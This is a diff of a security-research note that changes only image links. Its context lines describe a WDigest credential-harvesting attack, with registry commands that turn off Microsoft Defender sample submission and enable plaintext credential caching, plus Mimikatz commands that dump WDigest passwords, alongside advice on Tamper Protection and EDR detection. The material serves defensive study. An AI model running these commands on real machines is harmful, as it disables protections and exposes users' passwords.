@@ -11,7 +11,7 @@ WDigest, an outdated authentication protocol still found in corporate networks, 
 Its use exposes passwords in plain text, making it a favored target. Attackers modify registry settings to enable WDigest, often using various attack vectors. 
 
 
-![image](https://github.com/LearningKijo/Malware-Analysis/assets/120234772/05df9617-ef6a-4215-81a4-718b9cc5635e)
+![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/05b4876b-ebe3-48fc-8b59-398cffe0d928)
 > WDigest credential harvesting attack flow, [Threat Analytics](https://learn.microsoft.com/en-us/microsoft-365/security/defender/threat-analytics?view=o365-worldwide) in Microsoft 365 Defender
 
 ## Attack flow
@@ -29,7 +29,7 @@ reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "Spyne
 reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f
 ```
 
-![image](https://github.com/LearningKijo/Malware-Analysis/assets/120234772/f7dd4a2e-8e69-400c-b201-ca7ab2754c53)
+![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/28105886-3f1d-4cea-8de8-c7048a60bd9a)
 
 > [!Important]
 > These commands disabled Microsoft Defender Antivirus configurations. To prevent and detect these attack techniques, enabling [Tamper Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide) is the most effective approach, as it safeguards against disabling antivirus.
@@ -41,7 +41,7 @@ reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "Submi
 reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
 ```
 
-![image](https://github.com/LearningKijo/Malware-Analysis/assets/120234772/29806586-633c-460a-8873-43c960050620)
+![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/49e3a65c-fe1c-42da-9ac6-902fa5f1f51b)
 
 > [!Important]
 > Even if the antivirus didn't detect and prevent the WDigest configuration change, Microsoft Defender for Endpoint, as EDR solution, can detect these activities and provide alerts.
@@ -54,7 +54,7 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::wdigest
 ```
 
-![image](https://github.com/LearningKijo/Malware-Analysis/assets/120234772/825cf783-5f65-429d-a768-39e62694eea5)
+![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/9ef03db8-22a6-45fc-a8ca-5ac7dd4bb298)
 
 > [!Important]
 > In terms of endpoint protection, Microsoft Defender Antivirus and Microsoft Defender for Endpoint are the most effective solutions for preventing and detecting Mimikatz activities.
